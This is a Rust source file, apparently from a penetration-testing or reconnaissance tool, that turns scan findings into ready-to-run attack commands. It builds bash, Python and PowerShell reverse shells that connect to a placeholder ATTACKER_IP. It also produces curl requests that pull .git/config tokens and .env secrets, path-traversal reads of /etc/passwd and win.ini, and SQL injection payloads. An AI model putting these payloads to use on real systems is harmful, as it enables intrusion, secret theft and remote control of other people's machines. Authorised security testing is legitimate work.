use crate::graph::NodeData;

pub struct PocGenerator;

impl PocGenerator {
    /// Génère un PoC (Proof of Concept) pour une vulnérabilité donnée
    pub fn generate_poc(node: &NodeData) -> Option<String> {
        let ip = node.properties.get("ip")?;
        let port = node.properties.get("port")?;
        let finding = node.properties.get("finding")?.to_lowercase();
        let _service = node.properties.get("service").cloned().unwrap_or_default().to_lowercase();
        let node_type = node.properties.get("type").cloned().unwrap_or_default();

        // PoC pour Bug Bounty Gold (.git, .env)
        if node_type == "bug_bounty_gold" {
            if finding.contains(".git") {
                return Some(format!("curl -s http://{}:{}/.git/config | grep -E 'url|token'", ip, port));
            }
            if finding.contains(".env") {
                return Some(format!("curl -s http://{}:{}/.env", ip, port));
            }
        }

        // --- NOUVEAUX PAYLOADS AVANCÉS (PHASE 11) ---

        // RCE / Reverse Shell Stubs
        if finding.contains("rce") || finding.contains("remote code execution") || finding.contains("cve-2021-41773") || finding.contains("eternalblue") {
            let bash_rshell = format!("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
            let python_rshell = format!("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'");
            let powershell_rshell = format!("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()");

            return Some(format!(
                "--- OPTION 1: BASH REVERSE SHELL ---\n{}\n\n--- OPTION 2: PYTHON REVERSE SHELL ---\n{}\n\n--- OPTION 3: POWERSHELL ---\n{}", 
                bash_rshell, python_rshell, powershell_rshell
            ));
        }

        // Local File Inclusion (LFI)
        if finding.contains("lfi") || finding.contains("traversal") {
            return Some(format!(
                "--- LINUX LFI ---\ncurl -s \"http://{}:{}/path?file=../../../../etc/passwd\"\n\n--- WINDOWS LFI ---\ncurl -s \"http://{}:{}/path?file=../../../../windows/win.ini\"", 
                ip, port, ip, port
            ));
        }

        // SQL Injection (SQLi)
        if finding.contains("sqli") || finding.contains("sql injection") {
            return Some(format!(
                "--- UNION-BASED SQLi ---\n' UNION SELECT NULL,NULL,database(),user(),version()--\n\n--- ERROR-BASED ---\nAND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
            ));
        }

        // PoC pour Hidden Paths (/admin, /api)
        if node_type == "hidden_path" {
            let label_lower = node.label.to_lowercase();
            if label_lower.contains("/admin") {
                return Some(format!("curl -I http://{}:{}/admin", ip, port));
            }
            if label_lower.contains("/api") {
                return Some(format!("curl -X GET http://{}:{}/api/v1/users", ip, port));
            }
        }

        // PoC générique pour service vulnérable
        if finding.contains("vulnerable") || node.properties.get("status") == Some(&"vulnerable".to_string()) {
            return Some(format!("nmap --script {} -p {} {}", node.properties.get("source_script").unwrap_or(&"vuln".to_string()), port, ip));
        }

        None
    }
}
